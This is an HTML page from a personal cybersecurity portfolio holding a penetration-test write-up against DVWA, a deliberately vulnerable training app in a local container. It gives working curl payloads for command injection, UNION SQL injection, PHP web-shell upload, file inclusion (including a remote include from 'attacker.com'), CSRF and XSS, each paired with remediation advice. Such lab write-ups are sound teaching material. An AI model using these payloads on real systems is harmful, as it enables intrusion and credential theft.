@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A penetration test was conducted against the target running Damn Vulnerable Web Application (DVWA) v1.10 on Apache 2.4.10 with MySQL 5.5.54 inside a Docker cont">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Damn Vulnerable Web Application — Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Damn Vulnerable Web Application — Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Damn Vulnerable Web Application — Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">OWASP</span> <span class="tag diff diff-easy">Easy</span> <span class="dot">·</span> <span class="date">July 7, 2026</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 172.17.0.3   <strong>Assessment Date:</strong> July 7, 2026   <strong>Classification:</strong> CONFIDENTIAL  </p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>A penetration test was conducted against the target running Damn Vulnerable Web Application (DVWA) v1.10 on Apache 2.4.10 with MySQL 5.5.54 inside a Docker container. The assessment identified 12 security vulnerabilities ranging from Critical to Low severity. Initial access was gained through default credentials (admin/password), after which command injection, SQL injection, unrestricted file upload, and local file inclusion were exploited to achieve unauthenticated remote code execution as www-data. The MySQL database was also accessible externally with root privileges. The containerized environment limited privilege escalation to root on the host, but all DVWA application-layer vulnerabilities were fully exploitable.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>172.17.0.3</td>
+</tr>
+<tr>
+<td>Ports in Scope</td>
+<td>80 (HTTP), 3306 (MySQL)</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>Apache httpd 2.4.10, PHP 5.6.30, MySQL 5.5.54, DVWA v1.10</td>
+</tr>
+<tr>
+<td>Assessment Type</td>
+<td>External penetration test</td>
+</tr>
+<tr>
+<td>Environment</td>
+<td>Docker container (Debian 8.7, Kernel 7.0.0-27-generic)</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>3. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>Default Web Application Credentials</td>
+<td>9.1</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>Command Injection Leading to Remote Code Execution</td>
+<td>9.8</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>SQL Injection (UNION-based)</td>
+<td>9.1</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Unrestricted File Upload</td>
+<td>8.8</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>Local & Remote File Inclusion</td>
+<td>8.6</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-06</td>
+<td>Cross-Site Request Forgery (Password Change)</td>
+<td>8.0</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-07</td>
+<td>MySQL Root Access from Any Host</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-08</td>
+<td>Sensitive Information Disclosure — Directory Listings</td>
+<td>5.3</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>F-09</td>
+<td>Reflected Cross-Site Scripting (XSS)</td>
+<td>6.1</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>F-10</td>
+<td>Stored Cross-Site Scripting (XSS)</td>
+<td>6.1</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>F-11</td>
+<td>Brute Force Login Endpoint</td>
+<td>5.3</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>F-12</td>
+<td>Weak Password Hashing (MD5, Unsalted)</td>
+<td>5.3</td>
+<td>Medium</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>4. Detailed Findings</h2>
+<h3>F-01: Default Web Application Credentials</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.1)   <strong>Affected Component:</strong> <code>POST /login.php</code></p>
+<p><strong>Description:</strong>   The DVWA web application uses the vendor-default credentials <code>admin:password</code>. These credentials are documented in the application's README.md file and were not changed after deployment. An unauthenticated attacker can gain immediate administrative access to the entire DVWA application, including all vulnerability modules, the database setup page, and the PHP info page.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># Obtain CSRF token from login page
+TOKEN=$(curl -s -c /tmp/dvwa_cookies.txt http://172.17.0.3/login.php \
+  | grep user_token | sed &quot;s/.*value=&#x27;//&quot; | sed &quot;s/&#x27;.*//&quot;)
+
+# Login with default credentials
+curl -s -b /tmp/dvwa_cookies.txt -c /tmp/dvwa_cookies.txt -L \
+  -d &quot;username=admin&amp;password=password&amp;Login=Login&amp;user_token=$TOKEN&quot; \
+  http://172.17.0.3/login.php</code></pre>
+<p><strong>Impact:</strong> Full administrative access to the DVWA application, enabling an attacker to exploit all built-in vulnerabilities and gain remote code execution.</p>
+<p><strong>Recommendation:</strong> Change all default credentials immediately. Enforce password complexity requirements during setup.</p>
+<hr>
+<h3>F-02: Command Injection Leading to Remote Code Execution</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.8)   <strong>Affected Component:</strong> <code>POST /vulnerabilities/exec/</code> — parameter <code>ip</code></p>
+<p><strong>Description:</strong>   The "Command Injection" module executes a system ping command by concatenating user-supplied input directly into a shell command. No input sanitization or validation is performed. An attacker can inject arbitrary shell commands using command separators (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>), achieving full remote code execution as the www-data user.</p>
+<p><strong>Source Code:</strong></p>
+<pre><code>$target = $_REQUEST[ &#x27;ip&#x27; ];
+$cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target );</code></pre>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -s -b /tmp/dvwa_cookies.txt \
+  -d &quot;ip=127.0.0.1%3Bid&amp;Submit=Submit&quot; \
+  http://172.17.0.3/vulnerabilities/exec/
+
+# Response includes:
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+<p><strong>Impact:</strong> Complete remote code execution as the www-data user. Attacker can read files, execute commands, and pivot to internal services.</p>
+<p><strong>Recommendation:</strong> Never pass user input directly to shell functions. Use filter functions to validate IP address format (e.g., <code>filter_var($target, FILTER_VALIDATE_IP)</code>). Avoid <code>shell_exec()</code>, <code>exec()</code>, and <code>system()</code> with user-controlled input.</p>
+<hr>
+<h3>F-03: SQL Injection (UNION-based)</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.1)   <strong>Affected Component:</strong> <code>POST /vulnerabilities/sqli/</code> — parameter <code>id</code></p>
+<p><strong>Description:</strong>   The SQL Injection vulnerability module directly interpolates user input into a SQL query without parameterization or sanitization. An attacker can extract arbitrary data from the database using UNION-based SQL injection.</p>
+<p><strong>Source Code:</strong></p>
+<pre><code>$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</code></pre>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># Extract all user credentials
+curl -s -b /tmp/dvwa_cookies.txt \
+  -d &quot;id=1&#x27;+union+select+user,password+from+users--+&amp;Submit=Submit&quot; \
+  http://172.17.0.3/vulnerabilities/sqli/
+
+# Results:
+# admin:5f4dcc3b5aa765d61d8327deb882cf99
+# gordonb:e99a18c428cb38d5f260853678922e03
+# 1337:8d3533d75ae2c3966d7e0d4fcc69216b
+# pablo:0d107d09f5bbe40cade3de5c71e9e9b7
+# smithy:5f4dcc3b5aa765d61d8327deb882cf99</code></pre>
+<p>Cracked passwords:</p>
+<ul>
+<li>admin:password</li>
+<li>gordonb:abc123</li>
+<li>1337:charley</li>
+<li>pablo:letmein</li>
+<li>smithy:password</li>
+</ul>
+<p><strong>Impact:</strong> Complete disclosure of all user credentials stored in the database, including password hashes that are trivially cracked (MD5, unsalted).</p>
+<p><strong>Recommendation:</strong> Use prepared statements with parameterized queries. Implement proper input validation and least-privilege database accounts.</p>
+<hr>
+<h3>F-04: Unrestricted File Upload</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.8)   <strong>Affected Component:</strong> <code>POST /vulnerabilities/upload/</code></p>
+<p><strong>Description:</strong>   The file upload module performs no validation on uploaded file types. Any file extension (including <code>.php</code>, <code>.phtml</code>, <code>.php5</code>) can be uploaded. This allows an attacker to upload a malicious PHP web shell and access it directly in the web root, achieving remote code execution.</p>
+<p><strong>Source Code:</strong></p>
+<pre><code>$target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] );
+move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path );</code></pre>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># Create web shell
+echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; /tmp/cmd.php
+
+# Upload
+curl -s -b /tmp/dvwa_cookies.txt \
+  -F &quot;MAX_FILE_SIZE=100000&quot; \
+  -F &quot;uploaded=@/tmp/cmd.php;type=application/x-php&quot; \
+  -F &quot;Upload=Upload&quot; \
+  http://172.17.0.3/vulnerabilities/upload/
+
+# Execute commands
+curl -s &quot;http://172.17.0.3/hackable/uploads/cmd.php?cmd=id&quot;
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+<p><strong>Impact:</strong> Remote code execution as www-data through arbitrary PHP file upload.</p>
+<p><strong>Recommendation:</strong> Validate file extensions against an allowlist. Check MIME types. Disable execution permissions on the uploads directory.</p>
+<hr>
+<h3>F-05: Local & Remote File Inclusion</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.6)   <strong>Affected Component:</strong> <code>GET /vulnerabilities/fi/?page=</code> — parameter <code>page</code></p>
+<p><strong>Description:</strong>   The file inclusion module passes the <code>page</code> parameter directly to PHP's <code>include()</code> function with no filtering. Because <code>allow_url_include</code> is enabled in the PHP configuration, both Local File Inclusion (LFI) and Remote File Inclusion (RFI) are possible. An attacker can read arbitrary local files or include remote files containing malicious PHP code.</p>
+<p><strong>Source Code:</strong></p>
+<pre><code>$file = $_GET[ &#x27;page&#x27; ];
+// ... (no sanitization before include)</code></pre>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># LFI — read /etc/passwd
+curl -s -b /tmp/dvwa_cookies.txt \
+  &quot;http://172.17.0.3/vulnerabilities/fi/?page=/etc/passwd&quot;
+
+# RFI — include remote PHP shell (exploitable via hosted payload)
+curl -s -b /tmp/dvwa_cookies.txt \
+  &quot;http://172.17.0.3/vulnerabilities/fi/?page=http://attacker.com/shell.txt&quot;</code></pre>
+<p><strong>Impact:</strong> Arbitrary file read (LFI) and remote code execution (RFI). An attacker can read sensitive system files or execute code hosted on an external server.</p>
+<p><strong>Recommendation:</strong> Implement a whitelist of allowed include files. Disable <code>allow_url_include</code> in php.ini. Use a mapping array rather than direct user input for file inclusion.</p>
+<hr>
+<h3>F-06: Cross-Site Request Forgery (Password Change)</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.0)   <strong>Affected Component:</strong> <code>GET /vulnerabilities/csrf/</code> — parameters <code>password_new</code>, <code>password_conf</code></p>
+<p><strong>Description:</strong>   The password change functionality accepts GET requests and does not implement any CSRF token validation. An attacker can craft a malicious link or combine with XSS to force an authenticated user's password to be changed without their consent.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># Change password via GET (no CSRF token required)
+curl -s -b /tmp/dvwa_cookies.txt \
+  -G --data-urlencode &#x27;password_new=hacked123&#x27; \
+  --data-urlencode &#x27;password_conf=hacked123&#x27; \
+  --data-urlencode &#x27;Change=Change&#x27; \
+  http://172.17.0.3/vulnerabilities/csrf/
+
+# Response: &quot;Password Changed.&quot;</code></pre>
+<p><strong>Impact:</strong> An attacker can change any authenticated user's password by tricking them into visiting a crafted URL or combining with the XSS vulnerability.</p>
+<p><strong>Recommendation:</strong> Use POST method only. Implement CSRF tokens for all state-changing operations. Use <code>SameSite</code> cookie attributes.</p>
+<hr>
+<h3>F-07: MySQL Root Access from Any Host</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5)   <strong>Affected Component:</strong> MySQL on port 3306</p>
+<p><strong>Description:</strong>   The MySQL database grants root access from any host (<code>root@%</code>) with a weak password (<code>p@ssw0rd</code>). The MySQL service is exposed on port 3306 to the network. After flushing the host cache, an attacker can connect directly from an external machine.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># From inside (unblock host cache)
+mysql -u root -pp@ssw0rd -e &quot;FLUSH HOSTS;&quot;
+
+# From external Kali
+mysql -h 172.17.0.3 -u root -pp@ssw0rd --skip-ssl \
+  -e &quot;SELECT user,host,password FROM mysql.user;&quot;</code></pre>
+<p><strong>Impact:</strong> Full read/write access to all databases. An attacker can extract, modify, or destroy all application data.</p>
+<p><strong>Recommendation:</strong> Restrict MySQL user grants to specific hosts only. Use strong passwords. Remove wildcard host entries (<code>%</code>). Consider disabling remote MySQL access entirely.</p>
+<hr>
+<h3>F-08: Sensitive Information Disclosure — Directory Listings</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 5.3)   <strong>Affected Component:</strong> <code>/config/</code>, <code>/docs/</code>, <code>/external/</code></p>
+<p><strong>Description:</strong>   Apache directory listing is enabled, exposing several directories that leak sensitive information:</p>
+<ul>
+<li><code>/config/</code> — Exposes <code>config.inc.php</code> containing MySQL credentials (root:p@ssw0rd)</li>
+<li><code>/docs/</code> — Exposes DVWA_v1.3.pdf documentation</li>
+<li><code>/external/</code> — Exposes phpids and recaptcha subdirectories</li>
+</ul>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -s &quot;http://172.17.0.3/config/&quot;
+# Lists config.inc.php — attempt to fetch reveals PHP source not executed
+# (file was protected from direct PHP execution in this instance)</code></pre>
+<p><strong>Impact:</strong> Attackers can discover sensitive files and credentials, aiding further exploitation.</p>
+<p><strong>Recommendation:</strong> Disable directory listing in Apache configuration (<code>Options -Indexes</code>). Move configuration files outside the web root.</p>
+<hr>
+<h3>F-09: Reflected Cross-Site Scripting (XSS)</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 6.1)   <strong>Affected Component:</strong> <code>GET /vulnerabilities/xss_r/</code> — parameter <code>name</code></p>
+<p><strong>Description:</strong>   The reflected XSS module directly echoes user input without sanitization or encoding. An attacker can inject arbitrary JavaScript that executes in the context of the victim's browser.</p>
+<p><strong>Source Code:</strong></p>
+<pre><code>$html .= &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;</code></pre>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -s -b /tmp/dvwa_cookies.txt \
+  -G --data-urlencode &#x27;name=&lt;script&gt;alert(1)&lt;/script&gt;&#x27; \
+  --data-urlencode &#x27;Submit=Submit&#x27; \
+  http://172.17.0.3/vulnerabilities/xss_r/
+
+# Response: Hello &lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<p><strong>Impact:</strong> Session theft, phishing, or further client-side attacks in the context of the authenticated user's session.</p>
+<p><strong>Recommendation:</strong> Encode all user-supplied data with <code>htmlspecialchars()</code> or equivalent before output.</p>
+<hr>
+<h3>F-10: Stored Cross-Site Scripting (XSS)</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 6.1)   <strong>Affected Component:</strong> <code>POST /vulnerabilities/xss_s/</code></p>
+<p><strong>Description:</strong>   The stored XSS module (guestbook) stores user input in the database and displays it to all visitors without HTML encoding. While the input is sanitized with <code>mysql_real_escape_string()</code> to prevent SQL injection, no output encoding is performed. The <code>name</code> field accepts JavaScript payloads that execute for every visitor to the guestbook.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -s -b /tmp/dvwa_cookies.txt \
+  -d &quot;txtName=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;mtxMessage=Hello&amp;btnSign=Sign+Guestbook&quot; \
+  http://172.17.0.3/vulnerabilities/xss_s/</code></pre>
+<p><strong>Impact:</strong> Persistent JavaScript execution affecting all users who view the guestbook page, enabling session theft, defacement, or malware delivery.</p>
+<p><strong>Recommendation:</strong> Apply HTML entity encoding (<code>htmlspecialchars()</code>) to all user-supplied data before rendering. Implement Content Security Policy (CSP) headers.</p>
+<hr>
+<h3>F-11: Brute Force Login Endpoint</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 5.3)   <strong>Affected Component:</strong> <code>GET /vulnerabilities/brute/</code></p>
+<p><strong>Description:</strong>   The brute force module uses GET parameters for authentication with no rate limiting, account lockout, or CSRF protection. The backend is also vulnerable to SQL injection in the username/password fields, allowing authentication bypass without valid credentials.</p>
+<p><strong>Source Code:</strong></p>
+<pre><code>$query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;;</code></pre>
+<p><strong>Impact:</strong> An attacker can bypass authentication entirely via SQL injection or brute-force credentials without restriction.</p>
+<p><strong>Recommendation:</strong> Implement rate limiting, account lockout, and use parameterized queries. Switch to POST method with CSRF protection.</p>
+<hr>
+<h3>F-12: Weak Password Hashing (MD5, Unsalted)</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 5.3)   <strong>Affected Component:</strong> Application user database</p>
+<p><strong>Description:</strong>   User passwords are stored as unsalted MD5 hashes (via PHP's <code>md5()</code> function). All five user passwords were cracked instantly against common password lists. MD5 is a fast, non-cryptographic hash that provides no protection against offline cracking.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># Extracted via SQL injection:
+admin:5f4dcc3b5aa765d61d8327deb882cf99   -&gt; &quot;password&quot;
+gordonb:e99a18c428cb38d5f260853678922e03 -&gt; &quot;abc123&quot;
+1337:8d3533d75ae2c3966d7e0d4fcc69216b    -&gt; &quot;charley&quot;
+pablo:0d107d09f5bbe40cade3de5c71e9e9b7   -&gt; &quot;letmein&quot;
+smithy:5f4dcc3b5aa765d61d8327deb882cf99   -&gt; &quot;password&quot;</code></pre>
+<p><strong>Impact:</strong> Offline brute-force attacks can recover all user passwords rapidly. Cracked credentials can be used for application login.</p>
+<p><strong>Recommendation:</strong> Use bcrypt, Argon2, or PBKDF2 for password hashing with a unique salt per user. Password hashes should never use <code>md5()</code>.</p>
+<hr>
+<h2>5. Attack Chain Summary</h2>
+<pre><code>Port scan (nmap) — Ports 80, 3306 open
+    │
+    ▼
+Default credentials admin:password → DVWA admin access
+    │
+    ├──→ [F-01] Default Credentials
+    │
+    ▼
+Set security level to &quot;low&quot;
+    │
+    ├──→ Command Injection → RCE as www-data
+    │       └── Uploaded PHP webshell (/hackable/uploads/cmd.php)
+    │       └── [F-02] Command Injection RCE
+    │
+    ├──→ SQL Injection → Dump user database
+    │       └── Cracked MD5 hashes → all passwords recovered
+    │       └── [F-03] SQL Injection
+    │
+    ├──→ File Upload → Upload PHP shell
+    │       └── [F-04] Unrestricted File Upload
+    │
+    ├──→ File Inclusion → LFI (read /etc/passwd), RFI possible
+    │       └── [F-05] Local/Remote File Inclusion
+    │
+    ├──→ CSRF → Change admin password via GET
+    │       └── [F-06] CSRF
+    │
+    ├──→ MySQL external access (root@%, password p@ssw0rd)
+    │       └── [F-07] MySQL Root from Any Host
+    │
+    ├──→ Directory listing → config.inc.php exposed
+    │       └── [F-08] Directory Listings
+    │
+    ├──→ Reflected XSS → Script injection in browser
+    │       └── [F-09] Reflected XSS
+    │
+    ├──→ Stored XSS → Persistent guestbook injection
+    │       └── [F-10] Stored XSS
+    │
+    ├──→ Brute force login (GET, no rate limit, SQLi)
+    │       └── [F-11] Brute Force
+    │
+    └──→ MD5 password hashes → all cracked instantly
+            └── [F-12] Weak Password Hashing</code></pre>
+<h2>6. Remediation Priority</h2>
+<table>
+<thead><tr>
+<th>Order</th>
+<th>Finding</th>
+<th>Action</th>
+</tr></thead><tbody>
+<tr>
+<td>1</td>
+<td>F-02</td>
+<td>Harden command execution — never pass user input to shell</td>
+</tr>
+<tr>
+<td>2</td>
+<td>F-03</td>
+<td>Use prepared statements for all database queries</td>
+</tr>
+<tr>
+<td>3</td>
+<td>F-04</td>
+<td>Restrict file upload types and disable execution in uploads directory</td>
+</tr>
+<tr>
+<td>4</td>
+<td>F-05</td>
+<td>Whitelist allowed include files; disable allow_url_include</td>
+</tr>
+<tr>
+<td>5</td>
+<td>F-06</td>
+<td>Implement CSRF tokens; use POST for state changes</td>
+</tr>
+<tr>
+<td>6</td>
+<td>F-07</td>
+<td>Restrict MySQL root to localhost; change password</td>
+</tr>
+<tr>
+<td>7</td>
+<td>F-01</td>
+<td>Change all default credentials immediately</td>
+</tr>
+<tr>
+<td>8</td>
+<td>F-12</td>
+<td>Upgrade password hashing to bcrypt/Argon2</td>
+</tr>
+<tr>
+<td>9</td>
+<td>F-08</td>
+<td>Disable directory listing; move config outside web root</td>
+</tr>
+<tr>
+<td>10</td>
+<td>F-09</td>
+<td>Apply htmlspecialchars() to all user output</td>
+</tr>
+<tr>
+<td>11</td>
+<td>F-10</td>
+<td>Apply htmlspecialchars() to all stored user output</td>
+</tr>
+<tr>
+<td>12</td>
+<td>F-11</td>
+<td>Implement rate limiting; use POST with CSRF tokens</td>
+</tr>
+</tbody></table>
+<h2>7. Appendix: Recovered Credentials</h2>
+<table>
+<thead><tr>
+<th>Account</th>
+<th>Service</th>
+<th>Credential</th>
+</tr></thead><tbody>
+<tr>
+<td>admin</td>
+<td>DVWA Web App</td>
+<td>password</td>
+</tr>
+<tr>
+<td>gordonb</td>
+<td>DVWA Web App</td>
+<td>abc123</td>
+</tr>
+<tr>
+<td>1337</td>
+<td>DVWA Web App</td>
+<td>charley</td>
+</tr>
+<tr>
+<td>pablo</td>
+<td>DVWA Web App</td>
+<td>letmein</td>
+</tr>
+<tr>
+<td>smithy</td>
+<td>DVWA Web App</td>
+<td>password</td>
+</tr>
+<tr>
+<td>root</td>
+<td>MySQL</td>
+<td>p@ssw0rd</td>
+</tr>
+</tbody></table>
+<h2>8. Appendix: Affected URLs</h2>
+<table>
+<thead><tr>
+<th>Component</th>
+<th>URL</th>
+</tr></thead><tbody>
+<tr>
+<td>Login</td>
+<td><code>http://172.17.0.3/login.php</code></td>
+</tr>
+<tr>
+<td>Command Injection</td>
+<td><code>http://172.17.0.3/vulnerabilities/exec/</code></td>
+</tr>
+<tr>
+<td>SQL Injection</td>
+<td><code>http://172.17.0.3/vulnerabilities/sqli/</code></td>
+</tr>
+<tr>
+<td>SQL Injection (Blind)</td>
+<td><code>http://172.17.0.3/vulnerabilities/sqli_blind/</code></td>
+</tr>
+<tr>
+<td>File Upload</td>
+<td><code>http://172.17.0.3/vulnerabilities/upload/</code></td>
+</tr>
+<tr>
+<td>File Inclusion</td>
+<td><code>http://172.17.0.3/vulnerabilities/fi/?page=</code></td>
+</tr>
+<tr>
+<td>CSRF</td>
+<td><code>http://172.17.0.3/vulnerabilities/csrf/</code></td>
+</tr>
+<tr>
+<td>XSS (Reflected)</td>
+<td><code>http://172.17.0.3/vulnerabilities/xss_r/</code></td>
+</tr>
+<tr>
+<td>XSS (Stored)</td>
+<td><code>http://172.17.0.3/vulnerabilities/xss_s/</code></td>
+</tr>
+<tr>
+<td>Brute Force</td>
+<td><code>http://172.17.0.3/vulnerabilities/brute/</code></td>
+</tr>
+<tr>
+<td>Insecure CAPTCHA</td>
+<td><code>http://172.17.0.3/vulnerabilities/captcha/</code></td>
+</tr>
+<tr>
+<td>Config Disclosure</td>
+<td><code>http://172.17.0.3/config/</code></td>
+</tr>
+<tr>
+<td>PHP Info</td>
+<td><code>http://172.17.0.3/phpinfo.php</code></td>
+</tr>
+<tr>
+<td>Database Setup</td>
+<td><code>http://172.17.0.3/setup.php</code></td>
+</tr>
+<tr>
+<td>Security Settings</td>
+<td><code>http://172.17.0.3/security.php</code></td>
+</tr>
+</tbody></table>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
